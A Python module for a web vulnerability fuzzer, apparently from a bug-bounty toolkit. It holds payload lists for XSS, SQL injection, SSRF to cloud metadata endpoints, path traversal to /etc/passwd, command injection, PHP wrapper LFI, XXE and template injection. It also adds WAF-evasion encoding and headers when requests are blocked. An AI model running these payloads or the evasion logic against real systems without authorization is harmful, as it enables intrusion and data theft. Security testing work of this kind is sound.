#!/usr/bin/env python3
"""
Parameter Fuzzer Module
Tests URL parameters for common vulnerabilities:
- Reflected XSS
- SQL Injection indicators
- SSRF patterns
- Path Traversal
- Open Redirects
- Command Injection indicators

Uses safe, non-destructive payloads to detect reflection and error responses.
Includes false positive detection, template deduplication, and context-aware fuzzing.
"""

import re
import json
import time
import threading
import hashlib
from dataclasses import dataclass, field
from typing import List, Set, Dict, Optional, Tuple, Callable
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
from datetime import datetime

try:
    import requests
except ImportError:
    print("ERROR: requests library required. Install with: pip install requests")
    exit(1)

from utils.config import get_amazon_config, get_shopify_config
from analysis.false_positive_detector import FalsePositiveDetector, RedirectTracker
# Import WAF Evader if available (newly created)
try:
    from tools.techniques.waf_evasion import WAFEvader
except ImportError:
    WAFEvader = None


@dataclass
class FuzzResult:
    """Result of fuzzing a parameter"""
    url: str
    parameter: str
    vuln_type: str
    payload: str
    evidence: str
    severity: str
    confidence: str  # high, medium, low
    request: str = ""
    response_code: int = 0
    response_snippet: str = ""
    false_positive_check: str = ""  # Result of FP analysis
    verified: bool = True  # Whether finding passed FP checks


@dataclass
class FuzzSummary:
    """Summary of fuzzing results"""
    target: str
    parameters_tested: int = 0
    total_requests: int = 0
    findings: List[FuzzResult] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    fuzz_time: str = field(default_factory=lambda: datetime.utcnow().isoformat())


# Safe test payloads - designed to detect vulnerabilities without causing harm
# Each payload config includes enhanced detection with FP-aware validation
FUZZ_PAYLOADS = {
    "xss": {
        "payloads": [
            # Reflection detection
            "<xss_test_{{CANARY}}>",
            "'\"><xss_test_{{CANARY}}>",
            "javascript:xss_test_{{CANARY}}//",
            # Event handlers
            "'\"><img src=x onerror=xss_{{CANARY}}>",
            # Template injection probe
            "{{7*7}}",
            "${7*7}",
            "<%=7*7%>",
        ],
        "detect": lambda resp, canary: _detect_xss(resp, canary),
        "validate": lambda resp, payload, canary: _validate_xss(resp, payload, canary),
        "severity": "high",
        "requires_html": True,
    },
    "sqli": {
        "payloads": [
            # Error-based detection
            "'",
            "\"",
            "' OR '1'='1",
            "1' AND '1'='1",
            "1 UNION SELECT NULL--",
            # Time-based canary (won't actually delay)
            "1' AND SLEEP(0)--",
            # Boolean-based
            "1 AND 1=1",
            "1 AND 1=2",
        ],
        "detect": lambda resp, _: _detect_sqli(resp),
        "validate": lambda resp, payload, _: _validate_sqli(resp, payload),
        "severity": "critical",
        "requires_html": False,
    },
    "ssrf": {
        "payloads": [
            # Localhost variations
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://127.0.0.1:80",
            # Cloud metadata (safe - will just fail if no SSRF)
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            # DNS rebinding probe
            "http://localtest.me",
        ],
        "detect": lambda resp, _: _detect_ssrf(resp),
        "validate": lambda resp, payload, _: _validate_ssrf(resp, payload),
        "severity": "high",
        "requires_html": False,
    },
    "path_traversal": {
        "payloads": [
            # Basic traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            # Encoded versions
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc/passwd",
            # Null byte (legacy)
            "../../../etc/passwd%00",
        ],
        "detect": lambda resp, _: _detect_path_traversal(resp),
        "validate": lambda resp, payload, _: _validate_path_traversal(resp),
        "severity": "critical",
        "requires_html": False,
    },
    "open_redirect": {
        "payloads": [
            "//evil.com",
            "https://evil.com",
            "/\\evil.com",
            "//evil.com/%2f..",
            "///evil.com",
            "////evil.com",
            "https:evil.com",
        ],
        "detect": lambda resp, _: _detect_open_redirect(resp),
        "validate": lambda resp, payload, _: _validate_open_redirect(resp, payload),
        "severity": "medium",
        "requires_html": False,
    },
    "command_injection": {
        "payloads": [
            # Safe detection only - won't execute
            "|echo cmd_test_{{CANARY}}",
            ";echo cmd_test_{{CANARY}}",
            "`echo cmd_test_{{CANARY}}`",
            "$(echo cmd_test_{{CANARY}})",
            # Error indicators
            "| ls",
            "; cat /etc/passwd",
        ],
        "detect": lambda resp, canary: _detect_cmdi(resp, canary),
        "validate": lambda resp, payload, canary: _validate_cmdi(resp, payload, canary),
        "severity": "critical",
        "requires_html": False,
    },
    "lfi": {
        "payloads": [
            # PHP wrappers
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain,<?php phpinfo();?>",
            # Log injection
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
        ],
        "detect": lambda resp, _: _detect_lfi(resp),
        "validate": lambda resp, payload, _: _validate_lfi(resp, payload),
        "severity": "critical",
        "requires_html": False,
    },
    "xxe": {
        "payloads": [
            # XXE probe (won't work unless app parses XML)
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "xxe_test_{{CANARY}}">]><foo>&xxe;</foo>',
        ],
        "detect": lambda resp, canary: f"xxe_test_{canary}" in resp.text,
        "validate": lambda resp, payload, canary: _validate_xxe(resp, canary),
        "severity": "critical",
        "requires_html": False,
    },
    "ssti": {
        "payloads": [
            # Template injection probes
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{constructor.constructor('return this')()}}",
            "${T(java.lang.Runtime)}",
            "<%= 7*7 %>",
            "{php}echo 7*7;{/php}",
        ],
        "detect": lambda resp, _: _detect_ssti(resp),
        "validate": lambda resp, payload, _: _validate_ssti(resp, payload),
        "severity": "critical",
        "requires_html": True,
    },
}


# Enhanced detection functions with context awareness
def _detect_xss(resp: requests.Response, canary: str) -> bool:
    """Detect XSS reflection with basic check"""
    if not resp or not resp.text:
        return False
    return canary in resp.text or "<xss_test_" in resp.text


def _validate_xss(resp: requests.Response, payload: str, canary: str) -> Tuple[bool, str]:
    """Validate XSS is real, not escaped/encoded"""
    content = resp.text

    # Check if canary/payload is present
    search_term = canary if canary in content else payload
    if search_term not in content:
        return False, "Payload not reflected"

    # Check if in HTML comment
    if re.search(r'<!--.*?' + re.escape(search_term) + r'.*?-->', content, re.DOTALL):
        return False, "Payload in HTML comment"

    # Check if HTML-encoded
    if '&lt;' + search_term.replace('<', '') in content:
        return False, "Payload is HTML-encoded"

    # Check if URL-encoded
    if '%3c' + search_term.replace('<', '').lower() in content.lower():
        return False, "Payload is URL-encoded"

    # Check if in JavaScript string (escaped)
    if re.search(r'["\'][^"\']*\\x3c[^"\']*' + re.escape(search_term.replace('<', '')), content):
        return False, "Payload escaped in JS string"

    return True, "XSS reflection confirmed"


def _detect_sqli(resp: requests.Response) -> bool:
    """Detect SQL injection errors"""
    if not resp or not resp.text:
        return False

    content = resp.text.lower()
    error_patterns = [
        r'you have an error in your sql syntax',
        r'warning:.*mysql',
        r'unclosed quotation mark',
        r'quoted string not properly terminated',
        r'pg_query\(\):',
        r'pg_exec\(\):',
        r'ora-\d{5}',
        r'microsoft.*odbc.*sql server',
        r'syntax error.*at or near',
        r'invalid.*sql.*statement',
    ]

    return any(re.search(pattern, content) for pattern in error_patterns)


def _validate_sqli(resp: requests.Response, payload: str) -> Tuple[bool, str]:
    """Validate SQL injection is real, not FP from tech mentions"""
    content = resp.text.lower()
    
    # Check for actual error indicators
    real_error_patterns = [
        r'sql\s+syntax.*error',
        r'syntax\s+error.*sql',
        r'unclosed\s+quotation',
        r'unterminated.*string',
        r'invalid.*query',
        r'\d{4,5}.*error',  # Error codes
    ]

    if any(re.search(pattern, content) for pattern in real_error_patterns):
        return True, "SQL error confirmed"
        
    # Check for boolean differences if no error (future enhancement)
    
    return False, "No confirmed SQL error"


def _detect_ssrf(resp: requests.Response) -> bool:
    """Detect SSRF indicators"""
    if not resp or not resp.text:
        return False

    indicators = [
        'ami-id', 'instance-id', 'local-ipv4', 'meta-data',
        'iam/security-credentials', 'computeMetadata',
    ]
    return any(ind in resp.text for ind in indicators)


def _validate_ssrf(resp: requests.Response, payload: str) -> Tuple[bool, str]:
    """Validate SSRF response is from internal service"""
    content = resp.text
    if '169.254.169.254' in payload:
        if re.search(r'ami-id|instance-type|local-ipv4|iam/', content):
            return True, "AWS metadata access confirmed"
    if 'metadata.google.internal' in payload:
        if re.search(r'computeMetadata|project-id|instance/zone', content):
            return True, "GCP metadata access confirmed"
    return False, "No confirmed metadata access"


def _detect_path_traversal(resp: requests.Response) -> bool:
    """Detect path traversal success indicators"""
    if not resp or not resp.text:
        return False

    indicators = [
        'root:x:', 'root:*:', 'daemon:x:',
        '[extensions]', '[fonts]', '[boot loader]',
        '/bin/bash', '/bin/sh',
    ]
    return any(ind in resp.text for ind in indicators)


def _validate_path_traversal(resp: requests.Response) -> Tuple[bool, str]:
    """Validate path traversal shows actual file content"""
    content = resp.text
    if re.search(r'^[a-z_][a-z0-9_-]*:[x*]:\d+:\d+:', content, re.MULTILINE):
        return True, "passwd file format confirmed"
    if re.search(r'^\[(extensions|fonts|mci extensions)\]', content, re.IGNORECASE | re.MULTILINE):
        return True, "win.ini format confirmed"
    return False, "No confirmed file content"


def _detect_open_redirect(resp: requests.Response) -> bool:
    """Detect open redirect"""
    if not resp:
        return False
    if resp.status_code in [301, 302, 303, 307, 308]:
        location = resp.headers.get('Location', '')
        if 'evil.com' in location:
            return True
    return False


def _validate_open_redirect(resp: requests.Response, payload: str) -> Tuple[bool, str]:
    """Validate open redirect points to external domain"""
    if resp.status_code not in [301, 302, 303, 307, 308]:
        return False, "Not a redirect"
    location = resp.headers.get('Location', '')
    if 'evil.com' in location:
        return True, f"Redirect to: {location}"
    return False, "Redirect not to target"


def _detect_cmdi(resp: requests.Response, canary: str) -> bool:
    """Detect command injection"""
    if not resp or not resp.text: return False
    content = resp.text.lower()
    if f"cmd_test_{canary}" in resp.text: return True
    error_patterns = [r'sh:\s*\d*:', r'bash:.*:', r'/bin/.*:', r'command not found']
    return any(re.search(pattern, content) for pattern in error_patterns)


def _validate_cmdi(resp: requests.Response, payload: str, canary: str) -> Tuple[bool, str]:
    """Validate command injection evidence"""
    content = resp.text
    if f"cmd_test_{canary}" in content:
        return True, "Command output reflected"
    shell_errors = [r'sh:\s*\d*:.*not found', r'bash:.*command not found', r'/bin/.*:.*not found']
    if any(re.search(pattern, content.lower()) for pattern in shell_errors):
        return True, "Shell error indicates command parsing"
    return False, "No confirmed command execution"


def _detect_lfi(resp: requests.Response) -> bool:
    """Detect LFI indicators"""
    if not resp or not resp.text: return False
    indicators = ['PD9waHA', '<?php', 'phpinfo()', 'PHP Version']
    return any(ind in resp.text for ind in indicators)


def _validate_lfi(resp: requests.Response, payload: str) -> Tuple[bool, str]:
    content = resp.text
    if 'php://filter' in payload and 'PD9waHA' in content:
        return True, "PHP base64 output"
    if re.search(r'<title>phpinfo\(\)</title>', content):
        return True, "phpinfo detected"
    return False, "No LFI confirmed"


def _detect_ssti(resp: requests.Response) -> bool:
    """Detect SSTI with basic check"""
    if not resp or not resp.text: return False
    return '49' in resp.text or 'java.lang.Runtime' in resp.text


def _validate_ssti(resp: requests.Response, payload: str) -> Tuple[bool, str]:
    content = resp.text
    if 'java.lang.Runtime' in content: return True, "Java reflection"
    if '49' in content:
        # Avoid FPs where 49 is in the source anyway
        if re.search(r'(?<![0-9])49(?![0-9])', content):
            return True, "Math evaluation confirmed"
    return False, "No SSTI confirmed"


def _validate_xxe(resp: requests.Response, canary: str) -> Tuple[bool, str]:
    if f"xxe_test_{canary}" in resp.text:
        return True, "XXE entity expanded"
    return False, "No XXE expansion"


class ParamFuzzer:
    """Fuzz URL parameters for vulnerabilities with false positive detection and optimization"""

    def __init__(self, rate_limit: float = 5.0, user_agent: str = "BugBountyResearcher",
                 enable_fp_detection: bool = True):
        self.rate_limit = rate_limit
        self.min_interval = 1.0 / rate_limit
        self.last_request = 0.0
        self.lock = threading.Lock()
        self.user_agent = user_agent
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        })
        self.request_count = 0

        # False positive detection
        self.enable_fp_detection = enable_fp_detection
        self.fp_detector = FalsePositiveDetector(self.session, rate_limit) if enable_fp_detection else None
        self.redirect_tracker = RedirectTracker() if enable_fp_detection else None

        # WAF Evader
        self.waf_evader = WAFEvader(rate_limit=rate_limit) if WAFEvader else None
        
        # Deduplication
        self.baselines: Dict[str, requests.Response] = {}
        self.template_hashes: Set[str] = set()

        # Statistics
        self.stats = {
            'total_detections': 0,
            'false_positives_filtered': 0,
            'verified_findings': 0,
            'deduplicated_scans': 0,
        }

    def _rate_limit_wait(self):
        """Wait to respect rate limit"""
        with self.lock:
            now = time.time()
            elapsed = now - self.last_request
            if elapsed < self.min_interval:
                time.sleep(self.min_interval - elapsed)
            self.last_request = time.time()
            self.request_count += 1
            
            # WAF Adaptive Delay
            if self.waf_evader:
                self.waf_evader.adaptive_delay()

    def _make_request(self, url: str, method: str = "GET",
                      data: Dict = None, follow_redirects: bool = False) -> Optional[requests.Response]:
        """Make a rate-limited request"""
        self._rate_limit_wait()
        try:
            # Add WAF headers if available
            headers = None
            if self.waf_evader:
                headers = self.waf_evader.generate_headers(dict(self.session.headers))
            
            if method.upper() == "POST":
                response = self.session.post(url, data=data, headers=headers, timeout=10, allow_redirects=follow_redirects)
            else:
                response = self.session.get(url, headers=headers, timeout=10, allow_redirects=follow_redirects)

            # Update WAF evader status
            if self.waf_evader:
                self.waf_evader.should_backoff(response.status_code)

            return response
        except:
            return None

    def _get_baseline(self, url: str) -> Optional[requests.Response]:
        """Get or create baseline response for URL"""
        parsed = urlparse(url)
        base_key = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if base_key not in self.baselines:
            baseline_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            self.baselines[base_key] = self._make_request(baseline_url)

        return self.baselines.get(base_key)

    def _compute_template_hash(self, response: requests.Response) -> str:
        """Compute a hash of the response structure (ignoring dynamic content)"""
        # Replace numbers, dates, and dynamic strings to normalize
        content = str(response.status_code) + response.text
        # Very simple structural hash: remove alphanumeric runs logic?
        # Better: remove text between tags
        structure = re.sub(r'>[^<]+<', '><', content)
        return hashlib.md5(structure.encode()).hexdigest()

    def select_payloads(self, tech_stack: List[str] = None) -> List[str]:
        """Select relevant vulnerability types based on technology"""
        selected = list(FUZZ_PAYLOADS.keys())
        if not tech_stack:
            return selected
            
        tech_str = " ".join(tech_stack).lower()
        refined = []
        
        # Always check XSS, Open Redirect
        refined.append('xss')
        refined.append('open_redirect')
        
        if 'php' in tech_str:
            refined.extend(['lfi', 'sqli', 'ssrf', 'command_injection'])
        elif 'java' in tech_str or 'spring' in tech_str:
            refined.extend(['ssti', 'xxe', 'sqli', 'command_injection'])
        elif 'python' in tech_str or 'flask' in tech_str:
            refined.extend(['ssti', 'sqli', 'command_injection'])
        elif 'ruby' in tech_str:
              refined.extend(['ssti', 'sqli'])
              
        return list(set(refined)) # Unique

    def fuzz_parameter(self, url: str, param: str, original_value: str,
                       tech_stack: List[str] = None) -> List[FuzzResult]:
        """Fuzz a single parameter with specified vulnerability types"""
        results = []

        # Deduplication check
        baseline = self._get_baseline(url)
        if baseline:
            tmpl_hash = self._compute_template_hash(baseline)
            # If we've scanned this exact template structure before for this parameter...
            # Note: Deduplication needs to be careful not to skip different params on same page
            # So key should be template_hash + param_name
            dedup_key = f"{tmpl_hash}:{param}"
            if dedup_key in self.template_hashes:
                self.stats['deduplicated_scans'] += 1
                return results # Skip
            self.template_hashes.add(dedup_key)

        vuln_types = self.select_payloads(tech_stack)
        parsed = urlparse(url)
        base_params = parse_qs(parsed.query, keep_blank_values=True)

        for vuln_type in vuln_types:
            if vuln_type not in FUZZ_PAYLOADS:
                continue

            config = FUZZ_PAYLOADS[vuln_type]
            canary = hashlib.md5(f"{url}:{param}:{time.time()}".encode()).hexdigest()[:8]
            
            for payload in config["payloads"]:
                test_payload = payload.replace("{{CANARY}}", canary)
                
                # Apply WAF evasion encoding if needed
                if self.waf_evader and self.waf_evader.consecutive_blocks > 0:
                     test_payload = self.waf_evader.encode_payload(test_payload, "url")

                # Build test URL
                test_params = base_params.copy()
                test_params[param] = [test_payload]
                
                # Reconstruct query
                flat_params = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
                new_query = urlencode(flat_params)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                response = self._make_request(test_url)
                if not response:
                    continue
                
                # Check detection
                detect_func = config["detect"]
                if detect_func(response, canary):
                    self.stats['total_detections'] += 1
                    
                    # Validate
                    validate_func = config.get("validate")
                    is_verified = True
                    validation_msg = "Basic detection"
                    
                    if validate_func:
                        is_verified, validation_msg = validate_func(response, test_payload, canary)
                        
                    if is_verified:
                        self.stats['verified_findings'] += 1
                        results.append(FuzzResult(
                            url=url, parameter=param, vuln_type=vuln_type,
                            payload=test_payload, evidence=validation_msg,
                            severity=config["severity"], confidence="high"
                        ))
                    else:
                        self.stats['false_positives_filtered'] += 1

        return results
